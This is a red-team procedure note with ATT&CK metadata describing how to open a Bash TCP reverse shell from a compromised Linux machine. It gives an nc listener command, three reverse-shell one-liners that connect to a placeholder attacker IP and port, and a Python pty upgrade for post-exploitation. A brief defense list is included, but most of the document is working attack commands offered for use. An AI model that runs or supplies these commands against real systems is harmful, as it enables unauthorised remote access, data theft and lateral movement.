---
type: procedure
description: >-
  Establishes a reverse TCP shell connection from a compromised Linux target
  using Bash, allowing remote command execution.
verified: true
submitted: false
created_at: '2023-04-06T03:56:24Z'
updated_at: '2023-04-10T20:25:28Z'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Command-Line Interface|T1059 - Command-Line Interface]]'
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques: []
tags:
  - '[[tags/Bash]]'
  - '[[tags/Reverse Shell]]'
  - '[[tags/TCP]]'
commands:
  - '[[commands/nc-listen-for-reverse-shell]]'
  - '[[commands/bash-reverse-tcp-shell]]'
  - '[[commands/sh-reverse-tcp-shell-via-fd]]'
  - '[[commands/bash-login-reverse-tcp-shell]]'
platforms:
  - Linux
tools:
  - '[[tools/Netcat]]'
skill_level: beginner
impact_level: high
detection_risk: high
validated: true
---

# Establish-Bash-TCP-Reverse-Shell

## Summary

This procedure demonstrates how to establish a TCP-based reverse shell using Bash on a compromised Linux system. It involves setting up a listener on the attacker's machine and executing a one-liner command on the target to connect back, providing interactive shell access for post-exploitation activities like data exfiltration or lateral movement.

## Description

A Bash TCP reverse shell redirects the target's standard input, output, and error streams over a TCP connection to the attacker's listener, effectively providing remote shell access without requiring inbound ports open on the target. This technique is useful in scenarios where the attacker has initial command execution on the target (e.g., via RCE or credential compromise) and outbound connections are allowed. It maps to MITRE ATT&CK Execution (TA0002) through command-line invocation and Lateral Movement (TA0008) via remote service access. The procedure assumes a Linux environment with Bash available and network connectivity to the attacker. Variations are provided to handle potential restrictions like limited Bash features or shell availability.

## Requirements

1. Command execution access on the target Linux system (e.g., via initial foothold).
2. Bash or sh shell available on the target.
3. Network connectivity from target to attacker (outbound TCP allowed).
4. Netcat or equivalent listener tool on the attacker's machine.
5. Knowledge of attacker's IP and chosen port (e.g., 4242).

## Defense

- Monitor outbound network connections for unusual TCP traffic to attacker IPs/ports.
- Implement application whitelisting to restrict Bash/sh execution.
- Enable command-line auditing (e.g., via auditd on Linux) to log suspicious one-liners.
- Use network segmentation and egress filtering to block unauthorized outbound connections.
- Deploy EDR tools to detect reverse shell patterns in process trees and network behavior.

## Objectives

1. Set up a reliable listener on the attacker's system to receive the reverse connection.
2. Execute a Bash-based command on the target to initiate the outbound TCP shell.
3. Achieve interactive remote access for further post-exploitation.
4. Verify stable shell connectivity and handle potential variations for evasion.

## Instructions

### Step 1: Set Up TCP Listener on Attacker Machine

**Context**: Before executing the reverse shell on the target, start a listener on your control machine to accept the incoming connection. This uses Netcat to bind to a specified port and provide an interactive shell upon connection.

**Command** ([[commands/nc-listen-for-reverse-shell]]):
```bash
nc -lvnp $_LISTEN_PORT
```

> This command starts a verbose TCP listener on the specified port. Replace $_LISTEN_PORT with your chosen port (e.g., 4242). Expected output includes a message like "Listening on [0.0.0.0] (family 0, port 4242)". Upon successful connection from the target, you'll see the remote shell prompt, allowing command input and output.

### Step 2: Execute Reverse Shell Command on Target Machine

**Context**: With the listener running, execute one of the Bash TCP reverse shell variations on the compromised target. These one-liners redirect I/O over TCP to your IP and port. Choose based on target restrictions (e.g., if Bash is limited, use the sh variant). Replace placeholders with your actual IP and port.

**Option 1 - Basic Bash Reverse Shell** ([[commands/bash-reverse-tcp-shell]]):
```bash
bash -i >& /dev/tcp/$_ATTACKER_IP/$_LISTEN_PORT 0>&1
```

> This invokes an interactive Bash shell (-i) and redirects stdin/stdout/stderr to the TCP connection. Success is indicated by the listener receiving the connection and presenting a remote prompt (e.g., target's PS1). If Bash /dev/tcp is disabled, try the alternatives.

**Option 2 - Sh Reverse Shell via File Descriptor** ([[commands/sh-reverse-tcp-shell-via-fd]]):
```bash
0<&196;exec 196<>/dev/tcp/$_ATTACKER_IP/$_LISTEN_PORT; sh <&196 >&196 2>&196
```

> This uses a file descriptor (196) to open the TCP socket and runs sh with I/O redirected to it. It's useful if Bash /dev/tcp is unavailable but /dev/tcp works for exec. Expected: Connection hits listener, providing sh access. Verify by running 'id' or 'pwd' remotely.

**Option 3 - Bash Login Reverse Shell** ([[commands/bash-login-reverse-tcp-shell]]):
```bash
/bin/bash -l > /dev/tcp/$_ATTACKER_IP/$_LISTEN_PORT 0<&1 2>&1
```

> This starts a login Bash shell (-l) and redirects I/O to TCP. The -l flag loads environment like a login shell, potentially providing more context (e.g., PATH). Success: Listener connects, and remote commands execute in a full Bash environment. Test stability with multi-command inputs.

### Step 3: Verify and Stabilize Connection

**Context**: Once connected, test the shell for stability and upgrade if needed (e.g., to a fully interactive TTY). This ensures reliable post-exploitation.

**Instructions**: On the remote shell, run basic commands like 'whoami', 'pwd', or 'ls' to confirm access. To upgrade to a TTY (for better interaction like vi editing):

```bash
python -c 'import pty; pty.spawn("/bin/bash")' && export TERM=xterm
```

> If Python is available, this spawns a pty. Expected: Improved shell behavior without ^C issues. If unstable, retry with a different variation or tool like socat.
